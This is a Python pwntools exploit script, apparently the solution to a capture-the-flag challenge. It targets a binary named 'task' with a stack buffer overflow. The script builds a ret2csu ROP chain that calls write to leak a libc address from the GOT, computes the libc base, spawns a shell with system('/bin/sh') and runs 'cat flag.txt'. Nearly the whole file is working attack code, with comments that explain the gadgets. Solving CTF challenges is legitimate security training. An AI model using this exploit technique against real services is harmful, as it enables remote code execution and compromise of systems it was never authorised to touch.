from pwn import *
from rpyc import lib

elf = ELF('./task')
libc = ELF('./libc6_2.31-0ubuntu9.1_amd64.so')

if args.GDB:
	p = gdb.debug(elf.path, '\n'.join([
		"b *main+113",
		"c"
	]), env={'LD_PRELOAD': libc.path})
elif args.REMOTE:
	p = remote("localhost" if not args.ADDR else args.ADDR, 11313)
else:
	p = process(elf.path, env={'LD_PRELOAD': libc.path}) 


p.recvuntil(b"Give me something: ", drop=True)

PADDING = b'A' * 5 * 8


# we need to call write to leak libc function address
# to call write we need three registers - rdi (fd), rsi (buf), rdx (len)
# we have rdi and rsi gadgets but no gadget for rdx 
# we can use some code from __libc_csu_init	function

# .text:0000000000401240	mov     rdx, r14
# .text:0000000000401243	mov     rsi, r13
# .text:0000000000401246	mov     edi, r12d
# .text:0000000000401249	call    qword ptr [r15+rbx*8]
# .text:000000000040124D	add     rbx, 1
# .text:0000000000401251	cmp     rbp, rbx
# .text:0000000000401254	jnz     short loc_401240
# .text:0000000000401256
# .text:0000000000401256 loc_401256: 
# .text:0000000000401256	add     rsp, 8
# .text:000000000040125A	pop     rbx
# .text:000000000040125B	pop     rbp
# .text:000000000040125C	pop     r12
# .text:000000000040125E	pop     r13
# .text:0000000000401260	pop     r14
# .text:0000000000401262	pop     r15
# .text:0000000000401264	retn

# let's use 0x000000000040125A gadget to set values, and then jump to 0x0000000000401240  (r14 is copied to rdx)
# we need to call valid function at 0x0000000000401249, so r15+rbx*8 should point to the valid address (for example __libc_csu_fini, it is empty func)
# we are controlling both values, so we can set rbx to 0 and manipulate with r15
# after the call the cmp intruction the rbp should equals rbx, so setting rbp to one is a good idea


p.sendline(
	PADDING 
	+ p64(0x000000000040125A)
	+ p64(0) # rbx
	+ p64(1) # rbp
	+ p64(1) # r12 and edi
	+ p64(elf.got['write']) # rsi and r13 - address of write function (GOT)
	+ p64(8) # rdx and r14, we need to print 8 bytes
	+ p64(elf.got['write']) # r15 - call write function with prepared params
	+ p64(0x0000000000401240)
	+ p64(0x1337) * 7 # for series of 401256 gadgets

	+ p64(elf.symbols['main'])
)

write_leak = p.recvuntil(b"Give me something: ", drop=True).strip()
write_leak = u64(write_leak.ljust(8, b'\x00'))
print(f"Write leak {hex(write_leak)}")
libc_base = write_leak - libc.symbols['write']
libc.address = libc_base

print(f"libc base: {hex(libc_base)}")

p.sendline(
	PADDING
	+ p64(0x0000000000401263) # pop rdi ; ret
	+ p64(next(libc.search(b"/bin/sh"))) # /bin/sh string address
	+ p64(0x000000000040101a) # ret
	+ p64(libc.symbols['system'])
)

sleep(1.0)
p.sendline(b'cat flag.txt')

print(p.clean(1.0))

